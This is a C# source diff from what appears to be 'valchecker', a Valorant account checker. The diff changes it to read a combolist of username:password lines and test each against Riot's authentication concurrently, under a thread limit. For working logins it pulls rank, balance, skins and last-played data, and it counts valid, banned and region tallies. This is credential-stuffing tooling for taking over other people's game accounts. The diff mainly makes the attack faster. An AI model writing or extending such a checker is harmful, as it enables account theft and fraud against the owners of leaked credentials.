@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Security.Principal;
+using System.Threading;
 using valchecker;
 using valchecker_4._0_private_beta;
 
@@ -71,27 +72,32 @@ public static class mainProgram
     public static async Task Main(string? logpass = null)
     {
         skinsjsonloader.load();
-        string filePath = "C:\\Users\\roadhog\\source\\repos\\valchecker-4.0-private-beta\\assets\\test.txt";
-        string[] lines;
-        using (StreamReader sr = new StreamReader(filePath))
-        {
-            lines = sr.ReadToEnd().Split("\n");
-        }
-        accountsinfodb.totalnum = lines.Length;
+        var lines = vars.combolist;
+        accountsinfodb.totalnum = lines.Count;
         TextChangeHandler.RaiseTextChangeEvent($"Checked: 0/{accountsinfodb.totalnum}", "checkedlabel");
-        int response;
-        foreach (string line in lines)
-        {
-            Console.WriteLine(line);
-            response = await checkaccount(line);
+        int num = 0;
+        int threadam = vars.threadsam;
+        var tasks = new List<Task>();
 
-            if (response == 0) { TextChangeHandler.RaiseTextChangeEvent($"Valid: {++accountsinfodb.valid}", "validlabel"); }
-            else if (response == 4) { TextChangeHandler.RaiseTextChangeEvent($"Banned: {++accountsinfodb.banned}", "bannedlabel"); }
-            TextChangeHandler.RaiseTextChangeEvent($"Checked: {++accountsinfodb.checkednum}/" +
-                $"{accountsinfodb.totalnum}", "checkedlabel");
+        while (num < lines.Count)
+        {
+            while (tasks.Count >= threadam)
+            {
+                tasks.RemoveAll(task => task.IsCompleted);
+                await Task.Delay(100);
+            }
+            Console.WriteLine(lines[num]);
+
+            Task task = checkaccount(lines[num]);
+            tasks.Add(task);
+            num++;
         }
+
+        // Wait for all tasks to complete
+        await Task.WhenAll(tasks);
     }
-    public static async Task<int> checkaccount(string line)
+
+    private static async Task checkaccount(string line)
     {
         RiotClient client;
         Account account;
@@ -99,13 +105,31 @@ public static class mainProgram
         account = await client.AuthAsync(line.Trim());
         Console.WriteLine(account.errmsg != null ? account.errmsg : account.code);
         if (account.code == 1) { Console.WriteLine("rliomktjids"); }
-        if (account.region == null || account.code != 0) { return account.code; } // do smth here
-        await accountinfo.get_rank(account);
-        await accountinfo.get_lastplayed(account);
-        await accountinfo.get_balance(account);
-        await accountinfo.get_skins(account);
-        await accountsinfodb.updateinfo(account);
-        Console.WriteLine(account.ToString());
-        return 0;
+        if(account.code == 0)
+        {
+            await accountinfo.get_rank(account);
+            await accountinfo.get_lastplayed(account);
+            await accountinfo.get_balance(account);
+            await accountinfo.get_skins(account);
+            await accountsinfodb.updateinfo(account);
+        }
+        //Console.WriteLine(account.ToString());
+        TextChangeHandler.RaiseTextChangeEvent($"Checked: {++accountsinfodb.checkednum}/" +
+                        $"{accountsinfodb.totalnum}", "checkedlabel");
+
+        if (account.code == 0) { TextChangeHandler.RaiseTextChangeEvent($"Valid: {++accountsinfodb.valid}", "validlabel"); }
+        else if (account.code == 4)
+        {
+            TextChangeHandler.RaiseTextChangeEvent($"Banned: {++accountsinfodb.banned}", "bannedlabel");
+            return;
+        }
+        if (account.code == 0 && account.banuntil != null)
+        {
+            TextChangeHandler.RaiseTextChangeEvent(
+            $"TempBanned: {++accountsinfodb.tempbanned}", "tempbannedlbl");
+        }
+        if (account.region == null) { return; }
+        TextChangeHandler.RaiseTextChangeEvent($"{account.region.ToUpper()}: {accountsinfodb.regions[account.region]}",
+            $"{account.region}lbl");
     }
 }
